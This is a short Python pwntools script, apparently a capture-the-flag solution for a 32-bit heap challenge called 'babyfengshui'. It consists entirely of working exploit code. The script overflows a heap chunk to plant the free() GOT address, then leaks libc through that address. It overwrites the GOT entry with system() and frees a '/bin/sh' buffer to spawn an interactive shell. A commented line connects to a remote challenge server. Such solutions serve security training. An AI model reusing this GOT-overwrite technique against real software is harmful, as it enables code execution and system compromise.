from pwn import *
from LibcSearcher import *
a=process("./babyfengshui")
#a=remote("111.198.29.45","30021")
elf=ELF("./babyfengshui")
libc=ELF("./libc.so.6")

def add(size,length,payload):
	a.recvuntil("Action: ")
	a.sendline("0")
	a.recvuntil("size of description: ")
	a.sendline(str(size))
	a.recvuntil("name: ")
	a.sendline("AAAA")
	a.recvuntil(": ")
	a.sendline(str(length))
	a.recvuntil(": ")
	a.sendline(payload)

def delete(index):
	a.recvuntil("tion: ")
	a.sendline("1")
	a.recvuntil("index: ")
	a.sendline(str(index))

def put(index):
	a.recvuntil("tion: ")
	a.sendline("2")
	a.recvuntil(": ")
	a.sendline(str(index))

def edit(index,length,payload):
	a.recvuntil("tion: ")
	a.sendline("3")
	a.recvuntil(": ")
	a.sendline(str(index))
	a.recvuntil(": ")
	a.sendline(str(length))
	a.recvuntil("text: ")
	a.sendline(payload)

#make description's chunksize=72 byte
#name's chunksize=136 byte
add(0x80,10,"a")#add user1
add(0x80,10,"a")#add user2
add(8,8,"/bin/sh\x00")
delete(0)#free user1

#description's chunksize=208
add(268,0x19c,"A"*408+p32(elf.got["free"]))

put(1)
a.recvuntil("description: ")
free_addr=u32(a.recv(4))
#libc=LibcSearcher("free",free_addr)
#libc=ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")
system_addr=free_addr-libc.symbols["free"]+libc.symbols["system"]
edit(1,4,p32(system_addr))
delete(2)
a.interactive()




	
	
